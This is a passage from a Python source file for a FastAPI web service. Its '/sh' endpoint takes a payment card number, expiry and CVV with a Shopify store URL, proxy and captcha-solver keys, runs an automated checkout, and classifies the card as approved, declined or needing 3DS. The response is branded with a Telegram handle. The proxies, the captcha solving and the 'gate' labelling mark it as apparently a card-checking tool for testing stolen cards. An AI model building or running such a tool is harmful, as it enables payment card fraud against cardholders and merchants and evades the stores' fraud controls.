                            typename = receipt.get('__typename')

                            if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                                print(f"\033[92m✅ Approved: {receipt.get('orderIdentity', {}).get('id', 'N/A')}\033[0m")
                                result["Response"] = "Order completed 💎"
                                result["details"]["order_id"] = receipt.get('orderIdentity', {}).get('id')
                                return result
                            elif typename == 'ActionRequiredReceipt':
                                print(f"\033[93m🔐 3DS Required\033[0m")
                                result["Response"] = "OTP_REQUIRED"
                                action = receipt.get('action')
                                if action and action.get('offsiteRedirect'):
                                    result["details"]["redirect_url"] = action['offsiteRedirect']['url']
                                return result
                            elif typename == 'FailedReceipt':
                                err = receipt.get('processingError', {})
                                if err.get('code') == 'CAPTCHA_REQUIRED':
                                    action = receipt.get('action')
                                    if action and action.get('offsiteRedirect'):
                                        redirect_url = action['offsiteRedirect']['url']
                                        print(f"\033[93m 3DS redirect URL: {redirect_url}\033[0m")
                                        result["Response"] = "3DS_REQUIRED"
                                        result["details"]["redirect_url"] = redirect_url
                                        return result
                                print(f"\033[91m❌ Got Payment errors: {err.get('code', 'Unknown')}\033[0m")
                                result["Response"] = "CARD_DECLINED"
                                result["details"]["error"] = {
                                    "code": err.get('code'),
                                    "messageUntranslated": err.get('messageUntranslated', ''),
                                    "hasOffsitePaymentMethod": err.get('hasOffsitePaymentMethod', False),
                                    "__typename": err.get('__typename', 'PaymentFailed')
                                }
                                return result
                            else:
                                print(f"   Still processing... (type: {typename})")
                    print("   Polling timed out")
                    result["Response"] = "PENDING"
                    return result

                # No receipt and no errors? Unknown
                print("   Unknown GraphQL response")
                result["Response"] = "UNKNOWN"
                result["details"]["graphql"] = gql_data
                return result

        except Exception as e:
            print(f"\033[91m❌ Exception:{e}\033[0m")
            result["Response"] = "EXCEPTION"
            result["details"]["exception"] = str(e)
            return result

    return result

# ------------------------------------------------------------
#  FastAPI app
# ------------------------------------------------------------
app = FastAPI(title="𝐌𝐢𝐧𝐢 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭")

@app.get("/sh", response_class=JSONResponse)
async def shopify_check(
    cc: str = Query(..., description="cc|mm|yy|cvv"),
    url: str = Query(..., description="Shopify store URL"),
    proxy: str = Query(None, description="host:port:user:pass or host:port"),
    solver: str = Query(None, description="Captcha solver: '2captcha' or 'capsolver'"),
    solver_key: str = Query(None, description="API key for the selected solver")
):
    try:
        cc_num, month, year, cvv = cc.split('|')
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid cc format. Use cc|mm|yy|cvv")

    result = await run_shopify_checkout(url, cc_num, month, year, cvv, proxy, solver, solver_key)

    if result["Response"] in ("ERROR", "EXCEPTION"):
        raise HTTPException(status_code=500, detail=result)

    # Build clean response
    clean_result = {
        "Response": result["Response"],
        "CC": result["CC"],
        "Price": result["Price"],
        "Gate": result["Gate"],
        "Site": result["Site"],
        "t.me": "@xaed3n"
    }

    # If it's a decline and we have a specific error code, use it unless it's CAPTCHA_REQUIRED
    if result["Response"] == "CARD_DECLINED":
        error_detail = None
        if "error" in result.get("details", {}):
            err = result["details"]["error"]
            if isinstance(err, dict) and "code" in err:
                error_detail = err["code"]
            elif isinstance(err, str):
                error_detail = err
        elif "errors" in result.get("details", {}):
            errors = result["details"]["errors"]
            if errors and isinstance(errors, list):
                error_detail = errors[0] if errors else "UNKNOWN"
        if error_detail:
            # If error code is CAPTCHA_REQUIRED, keep as CARD_DECLINED, otherwise use the code
            if error_detail != "CAPTCHA_REQUIRED":
                clean_result["Response"] = error_detail
            # else leave as CARD_DECLINED

    # Include redirect URL for 3DS/OTP cases
    if result["Response"] in ("OTP_REQUIRED", "3DS_REQUIRED", "ACTION_REQUIRED") and "redirect_url" in result.get("details", {}):
        clean_result["redirect_url"] = result["details"]["redirect_url"]

    # Print final response to terminal
    print(f"\033[93mResponse: {json.dumps(clean_result)}\033[0m")

    return clean_result


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)